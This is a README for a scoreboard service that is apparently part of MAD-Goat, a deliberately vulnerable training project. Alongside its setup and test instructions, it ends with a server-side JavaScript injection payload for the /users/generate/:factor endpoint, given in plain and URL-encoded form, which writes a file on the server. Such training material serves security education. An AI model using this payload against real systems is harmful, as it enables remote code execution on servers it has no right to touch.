[![codecov-badge]][codecov]

# Mad Scoreboard Service

## Description

This is a service that generates a list of users with a score. The score is generated randomly and the list is sorted by
the score. The list is returned as a JSON object.

## Installation

### Consuming npm packages from GitHub's NPM registry

This project uses a package from the @MAD-Goat-Project organization's GitHub Package Registry.

To consume npm packages from GitHub's NPM registry follow these steps:

- Create a personal access token with the read:packages scope.
- Create or edit an existing ~/.npmrc file to include the following line, replacing TOKEN with your personal access
  token:
    - //npm.pkg.github.com/:_authToken=TOKEN
- If needed, install the package using the standard yarn add command:
    - yarn add @OWNER/PACKAGE_NAME

An example of a .npmrc file that grants access to the @octokit npm organization:

```bash
@:registry=https://npm.pkg.github.com"
@MAD-Goat-Project:registry=https://npm.pkg.github.com
//npm.pkg.github.com/:_authToken=AUTH_TOKEN
```

Be careful while writing the organization name.

NPM is not case-sensitive, so it doesn't matter if you write @MAD-Goat-Project or @mad-goat-project.

But yarn is case-sensitive, so you have to write @MAD-Goat-Project.

### Installing dependencies

```bash
$ yarn
```

## Running the app

```bash
# development
$ yarn run start

# watch mode
$ yarn run start:dev

# production mode
$ yarn run start:prod
```

## Test

```bash
# unit tests
$ yarn run test

# e2e tests
$ yarn run test:e2e

# test coverage
$ yarn run test:cov
```

## Example of a malicious payload

### URL for the API call

GET : {{BaseURL}}:{{Port}}/users/generate/:factor

### Malicious JavaScript code

This malicious payload will create a file named pwned.txt in the root directory of the server with the size of 1MB.

```bash
var fs = require("fs")

stream = fs.createWriteStream("pwned.txt", { flags: "w" }); 

const megabyte = "1000000", outputStr = "yougotpwned"; 
for (var i = 0; i < megabyte / outputStr.length; i++) { 
    stream.write("yougotpwned"); 
} 
stream.end();
```

### Encoded malicious JavaScript code

You can encode the malicious JavaScript code with this command (you need to have jq installed):

```bash
printf %s 'var fs=require("fs"),stream=fs.createWriteStream("pwned.txt",{flags:"w"});const megabyte="1000000",outputStr="yougotpwned";for(var i=0;i<megabyte/outputStr.length;i++) {stream.write("yougotpwned");}stream.end();'|jq -sRr @uri
```

The output will be:
```bash
var%20fs%3Drequire(%22fs%22)%2Cstream%3Dfs.createWriteStream(%22pwned.txt%22%2C%7Bflags%3A%22w%22%7D)%3Bconst%20megabyte%3D%221000000%22%2CoutputStr%3D%22yougotpwned%22%3Bfor(var%20i%3D0%3Bi%3Cmegabyte%2FoutputStr.length%3Bi%2B%2B)%20%7Bstream.write(%22yougotpwned%22)%3B%7Dstream.end()%3B
```

This malicious payload will create a file named pwned.txt in the root directory of the server.


[codecov]: https://codecov.io/gh/MAD-Goat-Project/mad-scoreboard-service

[codecov-badge]: https://codecov.io/gh/MAD-Goat-Project/mad-scoreboard-service/graph/badge.svg?token=2AVIP9VNY4

